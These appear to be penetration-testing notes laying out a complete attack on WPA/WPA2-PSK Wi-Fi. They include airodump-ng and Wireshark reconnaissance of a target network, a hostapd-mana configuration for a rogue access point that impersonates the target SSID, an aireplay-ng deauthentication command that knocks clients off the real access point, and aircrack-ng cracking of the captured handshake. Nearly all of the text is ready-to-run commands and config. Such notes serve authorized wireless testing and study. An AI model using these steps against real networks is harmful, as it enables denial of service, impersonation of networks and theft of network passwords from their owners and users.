#### Discovery

```
sudo airodump-ng -w discovery --output-format pcap wlan1mon
```

Identify:
- Target SSID
- AUTH
- Cipher
- Channel
- Mbits (MB)
- 2.4Ghz or 5Ghz

Deduce the 802.11 protocol in use.

airodump-ng only shows the highest encryption possible, so use Wireshark to check for WPA1 for example.

Display only beacon packets and specific SSID by using this filter: 
```
wlan.fc.type_subtype == 0x08 && wlan.ssid == "MySSID". # for beacon requests
wlan.fc.type_subtype == 0x04 # for probe requests
```

Still in Wireshark, review:

- IEEEE 802.11Wireless Management 
  - Tagged Parameters
    - Vendor Specific: Microsoft Corp.: WPA Information Element = AP supports WPA1
    - RSN Information = AP supports WPA2
    - Then, check for configuration.
      - Multicast
      - Unicast/Pairwise : TKIP/CCM(AES)?
      - Auth Key Management configuration : Confirm PSK ?


#### Creating Rogue AP

```
sudo apt install hostapd-mana
```

Example mana conf file when encryption details are not specified:
```
interface=wlan0
ssid=TheSSID
channel=6

hw_mode=g  # g for 2,4Ghz ; a if 5Ghz
ieee80211n=1 # By default, hostapd-mana will run in 802.11b

wpa=3 # 3 for both wpa1 and wpa2 ; 1 for only wpa1 ; 2 for only wpa2
wpa_key_mgmt=WPA-PSK # enable PSK authentication
wpa_passphrase=ANYPASSWORD # irrelevant, since we are only attempting to capture ahandshake

wpa_pairwise=TKIP CCMP # encryption with WPA1
rsn_pairwise=TKIP CCMP	# encryption with WPA2
# Cipher suite for multicast traffic is automatically set by hostapd-mana

mana_wpaout=TheSSID.hccapx # location to save the captured handshake
```

More parameters : https://github.com/sensepost/hostapd-mana/blob/master/hostapd/hostapd.conf

#### Capturing handshake

```
sudo hostapd-mana SSID-mana.conf
```

If the signal of the rogue AP is stronger than the target, the device will attempt to connect and the handshake will be captured. Otherwise, we can send deauth messages.

```
sudo aireplay-ng -0 1 -a <BSSID_LEGITIMATE_AP> -c <STATION_MAC_ADDRESS> wlan1mon
```

#### Cracking

```
aircrack-ng SSID.hccapx -e SSID -w /usr/share/john/password.lst
```
